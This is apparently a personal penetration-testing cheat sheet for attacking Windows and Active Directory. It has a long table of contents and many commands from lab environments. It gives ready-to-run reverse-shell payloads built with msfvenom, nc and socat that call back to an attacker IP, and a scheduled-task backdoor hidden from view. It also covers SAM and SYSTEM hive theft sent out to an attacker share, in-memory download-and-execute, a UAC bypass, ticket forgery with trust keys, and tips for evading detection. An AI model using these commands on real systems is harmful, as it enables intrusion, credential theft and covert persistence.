...
- [LDAP and Responder](#ldap-and-responder)
...
- [Cross Forest Trust Golden Ticket](#cross-forest-trust-golden-ticket)
- [Persistence in AD](#persistence-in-ad)
- [Persisting through AD Group Templates](#persisting-through-ad-group-templates)
  - [Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:](#add-fullcontrol-permissions-for-a-user-to-the-adminsdholder-using-powerview-as-da)
  - [Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder (Go for what you exactly need and not the full permissions):](#other-interesting-permissions-resetpassword-writemembers-for-a-user-to-the-adminsdholder-go-for-what-you-exactly-need-and-not-the-full-permissions)
  - [Using ActiveDirectory Module and RACE toolkit (https://github.com/samratashok/RACE):](#using-activedirectory-module-and-race-toolkit-httpsgithubcomsamratashokrace)
  - [Check (if what we did before worked or not) the Domain Admins permission - PowerView as normal user:](#check-if-what-we-did-before-worked-or-not-the-domain-admins-permission---powerview-as-normal-user)
  - [Using ActiveDirectory Module:](#using-activedirectory-module)
  - [Moreover now we can abuse: Abusing FullControl using PowerView:](#moreover-now-we-can-abuse-abusing-fullcontrol-using-powerview)
  - [Using ActiveDirectory Module:](#using-activedirectory-module-1)
  - [Abusing ResetPassword using PowerView:](#abusing-resetpassword-using-powerview)
  - [Using ActiveDirectory Module:](#using-activedirectory-module-2)
- [Credential Harvesting](#credential-harvesting)
- [Kerberoasting](#kerberoasting)
- [Pass-the-Hash, Overpass-the-Hash, and Kerberos Abuse](#pass-the-hash-overpass-the-hash-and-kerberos-abuse)
...
- [Forest Privilege Escalation](#forest-privilege-escalation)
- [MSSQL Trust Abuse](#mssql-trust-abuse)
- [OPSEC, Notes, and Defenses](#opsec-notes-and-defenses)
  - [Reduce the number of Domain Admins in your environment.](#reduce-the-number-of-domain-admins-in-your-environment)
  - [Limit login of DAs to Domain Controllers](#limit-login-of-das-to-domain-controllers)
  - [Avoid running services with DAs](#avoid-running-services-with-das)
  - [Protected Users Group](#protected-users-group)
  - [Protected Users Group (Contd.)](#protected-users-group-contd)
  ...
  - [Just In Time (JIT) administration](#just-in-time-jit-administration)
  - [JEA (Just Enough Administration)](#jea-just-enough-administration)
  - [Credential Guard (bypassed by mimikatz)](#credential-guard-bypassed-by-mimikatz)
  - [Device Guard (WDAC)](#device-guard-wdac)
  - [Bypassing ATA (Don't downgrade, use AES, comply with time policies, don't create tickets with 9999 time)](#bypassing-ata-dont-downgrade-use-aes-comply-with-time-policies-dont-create-tickets-with-9999-time)
  - [Check If You Are Caught](#check-if-you-are-caught)
  - [Obfuscation](#obfuscation)
  - [Notes](#notes)
  - [General way 2: of opsec.](#general-way-2-of-opsec)
  - [Things to remember 3: opsec](#things-to-remember-3-opsec)
  - [Things to remember 4: opsec](#things-to-remember-4-opsec)
  - [Things to remember 5: opsec](#things-to-remember-5-opsec)
  - [Things to remember 6: opsec](#things-to-remember-6-opsec)
  - [Things to remember 7: opsec](#things-to-remember-7-opsec)
  - [Things to remember 8: opsec](#things-to-remember-8-opsec)
  - [Things to remember 9: opsec](#things-to-remember-9-opsec)
  - [Things to remember 10: opsec](#things-to-remember-10-opsec)
  - [Things to remember 11: opsec](#things-to-remember-11-opsec)
  - [Things to remember 12: When looking for domain admins](#things-to-remember-12-when-looking-for-domain-admins)
  - [Things to remember 13: Kerberos double hop](#things-to-remember-13-kerberos-double-hop)
  - [Behavioural Bypassing](#behavioural-bypassing)
  - [Scenario 1: Download and execute in memory](#scenario-1-download-and-execute-in-memory)
  - [Scenario 2: Avoid spamming all machines](#scenario-2-avoid-spamming-all-machines)
...
- **List Scheduled tasks:**
  ...
  schtasks /query /tn vulntask /fo list /v
  ```
- **Check the file permissions (if we can modify or overwrite):**
...
- **Unquoted Service Paths:**
  ...
  ```
- **Generate the service executable (if we find a Path to an executable with spaces that is unquoted we win):** `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=4446 -f exe-service -o rev-svc2.exe`
...
- **Get the services whose configuration current user can modify.:**
  ...
  ```
- **Move the reverse shell service to the first unquoted directory that you find in the path:**

  ```powershell
  # Move the reverse shell service to the first unquoted directory that you find in the path
  move C:\Users\OXI-unpriv\reverse-svc2.exe C:\MyPrograms\Disk.exe
  ```
- **Restart the service:**
...
- **SeBackup / SeRestore (Pass the hash through SMB share and Registry dump):**
  ...
  ```powershell
  # SeBackup / SeRestore (Pass the hash through SMB share and Registry dump)
  reg save hklm\system C:\Users\OXIBackup\system.hive
  reg save hklm\sam C:\Users\OXIBackup\sam.hive
  ```
- **Create a share between the machines:**

  ```powershell
  # Create a share between the machines
  mkdir share
  python3.9 /opt/impacket/examples/smbserver.py -smb2support -username OXIBackup -password CopyMaster555 public share
  ```
- **Copy the files to the share:**

  ```powershell
  # Copy the files to the share
  copy C:\Users\OXIBackup\sam.hive \\<AttackerIP>\public\
  copy C:\Users\OXIBackup\system.hive \\<AttackerIP>\public\
  ```
- **Use impacket to retrieve the users' password hashes:**
  ...
  ```
- **Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:**
...
- **RID Hijacking:**
  Check the SID (Remember 500 is admin)

  ```powershell
  # RID Hijacking
  wmic useraccount get name,sid
  ```
- **Run regedit as System through PsExec:**
...
- **Backdooring files with msfvenom:** `msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=<AttackerIP> lport=4444 -b "\x00" -f exe -o puttyX.exe`

- **Persisting through services by creating a service:** `sc.exe create service2 binPath= "C:\windows\rev-svc.exe" start= auto`

- **Create Services with reverse shell:** `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=4448 -f exe-service -o rev-svc.exe`, `sc.exe create service2 binPath= "C:\windows\rev-svc.exe" start= auto`, `sc.exe start service`

- **Replace Service executables for persistence:** `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=5558 -f exe-service -o rev-svc2.exe`, `sc.exe query state=inactive`, `sc.exe config service3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"`

- **Create Scheduled Tasks for persistence:**
  Navigate to HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\ and find the Schedule task that we created and delete the Security Descriptor (SD) to make our schedule task invisible

  ```powershell
  # Create Scheduled Tasks for persistence
  schtasks /create /sc minute /mo 1 /tn TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe <AttackerIP> 4449" /ru SYSTEM
...
- **UAC Bypass methods for admin privileges (Run from cmd, to bypass defender):**
  Check your group integrity level with , We want high integrity if we want to have admin perms on a process no matter if we are already an admin. If we have medium do the following:

  ```powershell
  # UAC Bypass methods for admin privileges (Run from cmd, to bypass defender)
  whoami /groups | find "Label"
  set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<AttackerIP>:4445 EXEC:cmd.exe,pipes"
...
- **Netloader in-memory from a URL which then loads a binary from a filepath or URL:**
  ...
  ```
- **Download files using a Chrome User Agent:**
...
- **Run directly in memory:**
  ...
  ```powershell
  # Run directly in memory
  (New-Object System.NetWebClient).Downloadfile('http://') | IEX
  ```
...
- **Download a file with bitsadmin:**
  ...
  ```powershell
  # Download a file with bitsadmin
  bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\OXI\Desktop\payload.exe
  ```
- **Download from an SMB shared folder:**
...
- **Get Event logs for applications and services insights:**

  ```powershell
  # Get Event logs for applications and services insights
  Get-EventLog -List
  ```
- **Check if sysmon is present for potential logging:**
  ...
  ```
- **Find the sysmon configuration file to understand monitoring scope (Careful, may trigger AV):**
...
- **Perform DNS zone transfer with nslookup:**
  or The -t AXFR indicates that we are requesting a zone transfer, while @ precedes the DNS_SERVER that we want to query regarding the records related to the specified DOMAIN_NAME
...
- **LDAP Pass-back Attacks overview:**
...
- **Use Responder to poison LLMNR and NBT-NS requests:**
  (Responder listens for network requests to send poisoned responses, directing the requesting host to our IP.)
...
Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name. Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with C:\Windows\psexesvc.exe. Create some named pipes to handle stdin/stdout/stderr.
...
- **Configure GPO:**
1. In MMC, click **File -> Add/Remove Snap-in**. 2. Select **Group Policy Management** snap-in and click **Add**, then **Ok**. 3. Navigate to the appropriate GPO (Servers > Management Servers > Management Server Pushes). 4. Right-click the GPO and select **Edit** to open the Group Policy Management Editor.

- **To add your account to local groups:**
1. Expand **Computer Configuration** -> **Policies** -> **Windows Settings** -> **Security Settings**. 2. Right-click **Restricted Groups** and select **Add Group**. 3. Click **Browse**, enter **IT Support** and click **Check Names**, then **Ok** twice. 4. For the second filter, add **Administrators** and **Remote Desktop Users** groups. 5. Apply the changes. The GPO will be applied within 15 minutes, granting administrative and RDP permissions on the target server.
...
CaCertPath - The path to our exported CA certificate. CaCertPassword - The password used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz. Subject - The subject or common name of the certificate. This does not really matter in the context of what we will be using the certificate for. SubjectAltName - This is the User Principal Name (UPN) of the account we want to impersonate with this certificate. It has to be a legitimate user. NewCertPath - The path to where ForgeCert will store the generated certificate. NewCertPassword - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.
...
*Navigate to the Security of the group (Right-click->Properties->Security):* *Let's add our low-privileged user and grant Full Control: Click Add. Search for your low-privileged username and click Check Names. Click OK. Click Allow on Full Control. Click Apply. Click OK.*
...
In your runas-spawned terminal, type MMC and press enter. Click on File->Add/Remove Snap-in...
Click OK
```powershell
...
Right-Click on ENTERPRISE DOMAIN CONTROLLERS and select Edit settings, delete, modify security. Click on all other groups (except Authenticated Users) and click Remove.
...
Click Add. Type Domain Computers, click Check Names and then OK.
...
## Pass-the-Hash, Overpass-the-Hash, and Kerberos Abuse
...
*user - The user who has the constrained delegation permissions. domain - The domain that we are attacking since Kekeo can be used to forge tickets to abuse cross-forest trust. password - The password associated with the svcIIS account.*
```powershell
...
`Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LO CAL.kirbi"'`
```powershell
...
/domain:dollarcorp.moneycorp.local FQDN of the current domain /sid:S-1-5-21-1874506631-3219952063-538504511 SID of the current domain /sids:S-1-5-21-280534878-1496970234-700767426-519 SID of the enterprise admins group of the parent domain /rc4:7ef5be456dc8d7450fb8f5f7348746c5 RC4 of the trust key /user:Administrator User to impersonate /service:krbtgt Target service in the parent domain /target:moneycorp.local FQDN of the parent domain /ticket:C:\AD\Tools\trust_tkt.kirbi Path where ticket is to be saved
```powershell
...
- **Opsec Things to Remember 3:**
  If our target is 2016 and before then after using a golden ticket or a silver ticket, we can't use winrs or powershell remoting. However, you can still run commands using WMI ( ). If it's 2019 ++ you have no problem.

  ```powershell
  # Opsec Things to Remember 3
  gwmi -C win32_computersystem -ComputerName dcorp-dc
  ```
